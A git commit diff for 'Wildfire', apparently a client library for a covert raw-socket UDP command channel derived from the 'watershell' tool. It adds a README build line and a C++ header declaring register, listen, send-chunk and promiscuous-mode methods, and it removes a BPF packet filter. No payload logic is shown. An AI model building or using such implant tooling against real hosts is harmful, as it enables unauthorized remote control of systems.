2aa92acbacc2b40b6586316d8984792e0a6777cf
Nicholas O'Brien <ndo9903@rit.edu>
2019-04-17 02:36:43 -0700

    here we go :D!

--- README.md
+++ README.md
@@ -1,1 +1,7 @@
 # Wildfire
+Took alot of stuff from [watershell](https://github.com/wumb0/watershell) made by an alumni [wumb0](https://github.com/wumb0) that I decided to expand to a full client library.
+
+## Setup
+```
+g++ main.cpp wildfire.cpp -o ${INSERT_BINARY_NAME}
+```
--- wildfire.h
+++ wildfire.h
@@ -1,11 +1,8 @@
 #ifndef WILDFIRE_H_
 #define WILDFIRE_H_
 
-
+// Networking
 #include <net/if.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
 #include <netinet/in.h>
 #include <sys/socket.h>
 #include <sys/types.h>
@@ -21,40 +18,62 @@
 #include <netinet/ip.h>
 #include <netinet/udp.h>
 #include <signal.h>
-#include <stdbool.h>
+#include <ifaddrs.h>
 
-#define UDP_HDR_SIZE 8
+// General
+#include <iostream>
+#include <cstdlib>
+#include <csignal>
+#include <string>
+#include <cstring>
+#include <limits>
+#include <fstream>
+#include <regex>
+#include <sstream>
+#include <random>
 
-#define INET_HDR_LEN 5
-
-#define MAX_DATA_SIZE 1000
 
 
-/* BPF code generated with tcpdump -dd udp and port 12345
- * used to filter incoming packets at the socket level
- */
-struct sock_filter bpf_code[] = {
-    { 0x28, 0, 0, 0x0000000c },
-    { 0x15, 0, 6, 0x000086dd },
-    { 0x30, 0, 0, 0x00000014 },
-    { 0x15, 0, 15, 0x00000011 },
-    { 0x28, 0, 0, 0x00000036 },
-    { 0x15, 12, 0, 0x00003039 }, //5
-    { 0x28, 0, 0, 0x00000038 },
-    { 0x15, 10, 11, 0x00003039 }, //7
-    { 0x15, 0, 10, 0x00000800 },
-    { 0x30, 0, 0, 0x00000017 },
-    { 0x15, 0, 8, 0x00000011 },
-    { 0x28, 0, 0, 0x00000014 },
-    { 0x45, 6, 0, 0x00001fff },
-    { 0xb1, 0, 0, 0x0000000e },
-    { 0x48, 0, 0, 0x0000000e },
-    { 0x15, 2, 0, 0x00003039 }, //15
-    { 0x48, 0, 0, 0x00000010 },
-    { 0x15, 0, 1, 0x00003039 }, //17
-    { 0x6, 0, 0, 0x0000ffff },
-    { 0x6, 0, 0, 0x00000000 },
+
+class Wildfire {
+public:
+  char iface[100];
+  static Wildfire *Instance;
+  static void RunOnce(void);
+  static void Run(void);
+  static Wildfire *Init(std::string dst_ip);
+  static Wildfire *Init(std::string dst_ip, int dst_port);
+  static Wildfire *Init(std::string dst_ip, int dst_port, bool DEBUG);
+  static Wildfire *Init(std::string dst_ip, int dst_port, bool DEBUG, bool PROMISC);
+  static std::string GetHostname(void);
+  void Register(void);
+  std::string ListenOnce(void);
+  void SendChunk(std::string payload);
+  static void End(void);
+
+
+private:
+  bool DEBUG, PROMISC;
+  int sockfd;
+  struct ifreq *sifreq;
+  struct sock_fprog filter;
+  unsigned char gateway_mac[ETH_ALEN];
+  unsigned char interface_mac[ETH_ALEN];
+  uint32_t destination_ip, interface_ip;
+  uint16_t dst_port, src_port;
+
+  Wildfire(std::string dst_ip, int port, bool DEBUG, bool PROMISC);
+  void SetInterfaceMac();
+  void SetGatewayMAC(void);
+  void GetMacFromIP(char *ip_addr);
+  void GetInterfaceName(char iface[]);
+  void Sigint(int signum);
+  static void StaticSignalHandler(int signum){
+        Wildfire::End();
+  }
+  void CalcIPChecksum(struct iphdr *ip);
 };
+
 
 /* its a datagram inside a packet inside a frame!
  * gotta be packed though!
@@ -65,9 +84,4 @@ struct __attribute__((__packed__)) udpframe {
     struct udphdr udp;
     unsigned char data[ETH_DATA_LEN - sizeof(struct udphdr) - sizeof(struct iphdr)];
 };
-
-void send_status(unsigned char *buf, int code);
-void sigint(int signum);
-void ip_checksum(struct iphdr *ip);
-void udp_checksum(struct iphdr *ip, unsigned short *payload);
-#endif
+#endif // WILDFIRE_H_
